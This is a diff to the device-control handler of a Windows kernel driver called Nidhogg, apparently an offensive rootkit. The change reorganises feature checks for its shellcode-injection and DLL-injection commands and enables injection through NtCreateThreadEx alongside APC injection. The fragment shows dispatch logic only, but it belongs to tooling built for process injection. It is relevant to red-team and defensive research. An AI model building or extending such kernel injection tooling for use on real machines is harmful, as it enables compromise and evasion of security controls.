@@ -1024,12 +1024,6 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_NIDHOGG_INJECT_SHELLCODE: 
 	{
-		if (!Features.ApcInjection) {
-			KdPrint((DRIVER_PREFIX "Due to previous error, shellcode injection feature is unavaliable.\n"));
-			status = STATUS_UNSUCCESSFUL;
-			break;
-		}
-
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 		if (size % sizeof(ShellcodeInformation) != 0) {
 			status = STATUS_INVALID_BUFFER_SIZE;
@@ -1045,10 +1039,23 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		switch (data->Type) {
 		case APCInjection: {
+			if (!Features.ApcInjection) {
+				KdPrint((DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n"));
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+
 			status = InjectShellcodeAPC(data);
 			break;
 		}
 		case NtCreateThreadExInjection: {
+			if (!Features.CreateThreadInjection) {
+				KdPrint((DRIVER_PREFIX "Due to previous error, NtCreateThreadEx shellcode injection feature is unavaliable.\n"));
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+
+			status = InjectShellcodeThread(data);
 			break;
 		}
 		}
@@ -1064,12 +1071,6 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_NIDHOGG_INJECT_DLL:
 	{
-		if (!Features.ApcInjection) {
-			KdPrint((DRIVER_PREFIX "Due to previous error, dll injection feature is unavaliable.\n"));
-			status = STATUS_UNSUCCESSFUL;
-			break;
-		}
-
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 		if (size % sizeof(DllInformation) != 0) {
 			status = STATUS_INVALID_BUFFER_SIZE;
@@ -1085,10 +1086,22 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		switch (data->Type) {
 		case APCInjection: {
+			if (!Features.ApcInjection) {
+				KdPrint((DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n"));
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+
 			status = InjectDllAPC(data);
 			break;
 		}
 		case NtCreateThreadExInjection: {
+			if (!Features.CreateThreadInjection) {
+				KdPrint((DRIVER_PREFIX "Due to previous error, NtCreateThreadEx dll injection feature is unavaliable.\n"));
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+
 			status = InjectDllThread(data);
 			break;
 		}
